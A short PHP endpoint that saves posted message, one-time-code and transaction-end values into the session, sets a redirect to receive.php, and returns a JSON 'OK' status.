<?php
header("Content-type: application/json; charset=utf-8");
session_start();

if(strpos($_POST["message"], "OK") !== false){
   $_SESSION['message'] = $_POST["message"];
}

if(isset($_POST["otpCode"])){
   $_SESSION["otpCode"] = $_POST["otpCode"];
}

if(isset($_POST["endTrx"])){
   if($_POST["endTrx"] == "finalRecepcion"){
      $_SESSION["urlTo"] = "receive.php";
   }
}

$result = array("status" => 'OK');
echo json_encode($result);